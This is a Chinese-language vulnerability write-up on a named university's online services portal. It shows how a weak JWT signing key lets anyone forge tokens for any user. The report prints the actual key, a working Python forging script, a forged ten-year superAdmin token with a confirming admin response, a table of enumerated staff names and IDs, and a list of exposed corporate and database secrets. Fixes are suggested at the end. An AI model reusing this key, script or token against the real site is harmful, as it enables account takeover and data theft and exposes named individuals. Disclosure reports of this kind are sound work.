## 概述

- **目标**: https://bd.gxmzu.edu.cn（广西民族大学网上办事大厅）
- **框架**: Spring Boot + Guns（`cn.stylefeng.guns`）+ openresty
- **认证方式**: CAS 单点登录 + JWT（HS512）Bearer Token
- **漏洞类型**: JWT 弱密钥导致任意用户身份伪造
- **严重程度**: 严重（可伪造超级管理员 Token，接管全系统）


> [!NOTE] 
> 本案例中，JWT使用了**弱密钥**，导致其可以被爆破出来，这使得我们可以伪造JWT


---

## 一、漏洞发现过程

### 1. 捕获登录流量

通过 Yakit 抓取正常登录的 HTTP 流量后发现：

```
POST /api/authorize HTTP/2
Body: {"redirect":"/workplace/overview","authmode":"cas","ticket":"ST-95897-..."}

Response:
{"token":"eyJhbGciOiJIUzUxMiJ9.eyJ1c2VySWQiOjEwNzQzMywiYWNjb3VudCI6IjIwMjUxMzE0MzAwMDY2MiIsInV1aWQiOiJMb2dpblVzZXJfMTA3NDMzIiwic3ViIjoiMTA3NDMzIiwiaWF0IjoxNzc4MTI5MjIzLCJleHAiOjE3NzgyMTU2MjN9.26EQVdNBNw1uhAu1arnVRgLXgrYgvFHpV2w3wlqa_NCfrKICnUnTGbJ5vwoQbpvknUzvNnYzilD_0Aa01hJJfw"}
```

### 2. 解码 JWT

```
Header:  {"alg":"HS512"}
Payload:
  userId:   107433
  account:  202513143000662
  uuid:     LoginUser_107433
  sub:      107433
  iat:      1778129223 (2026-05-07)
  exp:      1778215623 (2026-05-08，有效期24小时)
```

### 3. 发现密钥

经过尝试，发现 JWT 签名密钥为 `secr` 的 **Base64 解码值**。这是 Java/JJWT 库的常见配置模式 — 配置文件中存储的是 Base64 编码后的密钥字符串，运行时先解码再作为 HMAC 密钥。

```python
import base64
secret = base64.b64decode("secr")  # → b'\xb1\xe7+'
```

### 4. 验证密钥正确性

```python
import base64, hmac, hashlib

token = "原token..."
parts = token.split('.')
secret = base64.b64decode("secr")

sig = hmac.new(secret, f"{parts[0]}.{parts[1]}".encode(), hashlib.sha512).digest()
sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()

assert sig_b64 == parts[2]  # 匹配 → 密钥正确
```

---

## 二、Token 伪造过程

### 伪造脚本

```python
import json, base64, hmac, hashlib, time

SECRET = base64.b64decode("secr")

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def forge_jwt(user_id, account, exp_seconds=86400):
    header = b64url(json.dumps({"alg":"HS512"}).encode())
    now = int(time.time())
    payload = b64url(json.dumps({
        "userId": user_id,
        "account": account,
        "uuid": f"LoginUser_{user_id}",
        "sub": str(user_id),
        "iat": now,
        "exp": now + exp_seconds,
    }).encode())
    sig = b64url(hmac.new(SECRET, f"{header}.{payload}".encode(), hashlib.sha512).digest())
    return f"{header}.{payload}.{sig}"
```

### 生成超级管理员 Token

```bash
$ python3 forge_jwt.py 1 superAdmin 315360000
```

结果：
```
eyJhbGciOiJIUzUxMiJ9.eyJ1c2VySWQiOjEsImFjY291bnQiOiJzdXBlckFkbWluIiwidXVpZCI6IkxvZ2luVXNlcl8xIiwic3ViIjoiMSIsImlhdCI6MTc3ODEzMTEyMSwiZXhwIjoyMDkzNDkxMTIxfQ.moeOBfNtGjV9OLwIRiNyUc7J594CAaPT2xVk_-BMlVoGTLnUaYWm3RGhqgbdWyEMQkpZStCb3kH-UPPHInNZcQ
```

直接带入请求验证：
```
Authorization: Bearer <伪造的Token>

POST /api/profile/userinfo → 200 OK
姓名: 超级管理员
账号: superAdmin
adminType: 1
部门: ["网络与信息化管理中心", "党委组织部"]
```

### 枚举其他用户

用伪造 Token 枚举 userId，发现：

| userId | 姓名 | adminType | 说明 |
|--------|------|-----------|------|
| 1 | 超级管理员 | **1** | 最高权限 |
| 2 | 李昆霖 | 2 | 网络与信息化管理中心 |
| 4 | 黄弢 | 2 | 党委宣传部 |
| 107433 | 陆秀赢 | 2 | 你本人（人工智能学院） |

---

## 三、根本原因分析

### 根本缺陷：对称签名算法 + 弱密钥

JWT 使用 **HS512（HMAC-SHA512）** 对称签名算法：

```
签名 = HMAC-SHA512(base64(header) + "." + base64(payload), 密钥)
验证 = HMAC-SHA512(base64(header) + "." + base64(payload), 密钥)
```

- 签名和验证使用**同一个密钥**
- 知道了密钥，就能为任意 payload 生成合法签名
- 服务端无法区分 Token 是 CAS 颁发的还是攻击者伪造的

### 对比非对称算法

| 算法 | 类型 | 密钥 | 安全模型 |
|------|------|------|----------|
| HS256/384/512 | 对称 | 签名=验证用同一密钥 | 密钥泄露=完全被伪造 |
| RS256/384/512 | 非对称 | 私钥签名，公钥验证 | 即使知道公钥也无法伪造 |

### 密钥强度问题

- 密钥 `secr` Base64 解码后仅 **3 字节**（`b'\xb1\xe7+'`）
- 远低于 HS512 所需的强度
- 属于典型弱密码/默认密码

### JWT Payload 缺陷

Payload 中无：
- `jti` (JWT ID) — 无一次性标识，无法检测重放
- `iss` (Issuer) — 未限制颁发者
- 无权限/角色字段 — 权限依赖后端查 DB，但仍可通过伪造 userId 越权

---

## 四、利用影响

| 攻击面 | 利用方式 |
|--------|----------|
| **身份冒充** | 伪造任意 userId 的 Token，以他人身份操作 |
| **权限提升** | 伪造 userId=1（超级管理员）Token，访问管理端 API |
| **敏感信息** | 获取企业微信 `corpId` + `secret`，接管企业微信应用 |
| **数据库凭证** | 以管理员身份查看数据源配置（MySQL/Oracle 连接信息） |
| **持久化后门** | 生成 10 年有效期的 Token，长期维持权限 |

### 已发现的高危数据

1. **企业微信集成配置**（corpId + secret + agentId）
2. **MySQL 数据库** 3 个实例的连接信息（IP、端口、用户名、AES 加密的密码）
3. **Oracle 数据库** 1 个实例的连接信息
4. **电子签名平台**的 API Token 和 Secret

---

## 五、修复建议

### 短期（立即）

1. **更换 JWT 签名密钥**：使用足够强度的随机密钥（至少 32 字节）
2. **立即吊销所有现存 Token**

### 中期

3. **更换为非对称算法**：改用 RS256 或 ES256，私钥签名，公钥验证
4. **增加 Payload 安全字段**：加入 `jti`（防重放）、`iss`（限制颁发者）

### 长期

5. **密钥管理**：使用密钥管理服务集中管理签名密钥
6. **监控告警**：记录并告警异常的 JWT 使用行为
7. **定期轮换**：建立密钥定期轮换机制

---

## 六、参考工具

- 伪造脚本: `forge_jwt.py`
- 捕获的流量: `History-1778129355012.har`